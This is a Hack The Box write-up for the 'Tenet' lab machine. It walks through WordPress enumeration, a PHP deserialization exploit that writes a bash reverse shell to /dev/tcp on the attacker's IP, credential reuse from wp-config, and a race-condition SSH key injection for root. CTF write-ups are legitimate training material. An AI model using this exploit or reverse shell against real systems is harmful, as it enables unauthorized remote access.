---
title: Tenet Writeup
author: mooncakeza
date: 2021-06-14 14:30pm
categories: [hackthebox]
tags: [hackthebox, writeup, tenet]
math: true
image: /assets/img/htb/Tenet/00 - tenet infocard.png
---

# Reconnaissance

Let us start with a basic enumeration with nmap.

```bash
sudo nmap -sC -sV
```
![Tenet](/assets/img/htb/Tenet/01 nmap scan.png){:.align-center}

We go to http://10.10.10.223 and we get a default Apache page.

![Tenet](/assets/img/htb/Tenet/02 apache default page.png){:.align-center}

We then run feroxbuster web enumeration

```
feroxbuster --url http://10.10.10.223 
```

We find the following

![Tenet](/assets/img/htb/Tenet/03 feroxbuster results.png){:.align-center}

We go to http://10.10.10.223/wordpress and find it is running wordpress.
<br>
We browse around and If we hover over <b>'Tenet'</b> at the bottom we see a hostname <b>'tenet.htb'</b>

![Tenet](/assets/img/htb/Tenet/04 wordpress hostname.png){:.align-center}

We add <b>tenet.htb</b> to our hosts file and then browse to http://tenet.htb
<br>
Now everything on the site loads properly.

![Tenet](/assets/img/htb/Tenet/05 wordpress site.png){:.align-center}

After browsing around we find the following comment left by a user.

![Tenet](/assets/img/htb/Tenet/06 neil comment.png){:.align-center}

Seems like someone might have left a file called <b>sator.php</b> and maybe a backup of it?

Let's go check.
I just add <b>sator.php</b> and <b>sator.php.bak</b> into a file called words.txt and ran feroxbuster with it.

```
feroxbuster --url http://10.10.10.223 -w words.txt
```

![Tenet](/assets/img/htb/Tenet/07 - sator.png){:.align-center}

<b>Code 200</b> confirms we have an OK success status code.

Browsing to http://10.10.10.223/sator.php we get

![Tenet](/assets/img/htb/Tenet/08 - sator.php.png){:.align-center}

We then also download the <b>http://10.10.10.223/sator.php.bak</b>  and find the following code.

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

# Foothold

I struggle with these types of challenges but 
essentially looking at the code it seems we can create our own php file and insert data to get RCE.
<br>
We just have to create our own php file with code to do this request.
<br>
We can see it could be some sort of <b>PHP Deserialization RCE</b>
<br>
Looking at the following articles we can get an idea of what needs to be done.
<br>
- [https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php](https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php)
<br>
- [https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)

We create our own PHP file with the following to add our reverse shell code into a file called moo.php and then call it to create a reverse shell.

```php
<?php

class DatabaseExport
{
	public $user_file = 'moo.php';
	public $data = '<?php exec("bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.104/9998 0>&1\'"); ?>';

	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo 'EXPLOITED';
	}
}

$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/moo.php");
?>
```


We start a netcat listener on port 9998
<br>
We run the php file.

![Tenet](/assets/img/htb/Tenet/09 - run php.png){:.align-center}

We get a reverse shell on our netcat.

![Tenet](/assets/img/htb/Tenet/10 - reverse shell.png){:.align-center}

# User

Seeing that this is a wordpress site the first place I usually go and check for credentials is the <b>wp-config.conf</b>>. 
<br>
Jackpot.
<br>
![Tenet](/assets/img/htb/Tenet/11 - wordpress details.png){:.align-center}
<br>
I use those details to ssh into the machine and we have user on the box.
<br>

![Tenet](/assets/img/htb/Tenet/12 - neil user.png){:.align-center}
<br>
We check and there is the user flag.
<br>
![Tenet](/assets/img/htb/Tenet/13 - user flag.png){:.align-center}

# Privilege Escalation

Now for privsec
<br>
Let us check the sudoers file.
<br>
Seems we have access to a run a script as sudo.
<br>

![Tenet](/assets/img/htb/Tenet/14 - sudo.png){:.align-center}

We look at the script and find this part that is interesting.
<br>
We can inject our own ssh key!
<br>

![Tenet](/assets/img/htb/Tenet/15 - addKey.png){:.align-center}

We create our own key with <b>ssh-keygen</b>

![Tenet](/assets/img/htb/Tenet/16 - keygen.png){:.align-center}

We create a <b>while true</b> script called <b>sshkey.sh</b> to put our key in and inject it into a /tmp/ssh-* file which then injects it into the authorized_keys file for the root user.
<br>
Create a file sshkey.sh and put your public key in there. 
<br>
I had named mine moonkey.pub.
<br>
![Tenet](/assets/img/htb/Tenet/17 - for script.png){:.align-center}
<br>
Open up another terminal and ssh to the machine as neil.
<br>
Now run the script on the remote machine

```bash
chmod +x sshkey.sh
./sshkey.sh
```

Then in the other terminal run
<br>
![Tenet](/assets/img/htb/Tenet/18 - script run.png){:.align-center}
<br>
SSH Key has been added to root's authorized_keys file!
<br>
Now we try ssh with our key we generated to root.

```bash
ssh -i moonkey root@10.10.10.223
```

![Tenet](/assets/img/htb/Tenet/19 - root logged in.png){:.align-center}
<br>
We have root!
Let's grab the root flag.
<br>
![Tenet](/assets/img/htb/Tenet/20 - root flag.png){:.align-center}
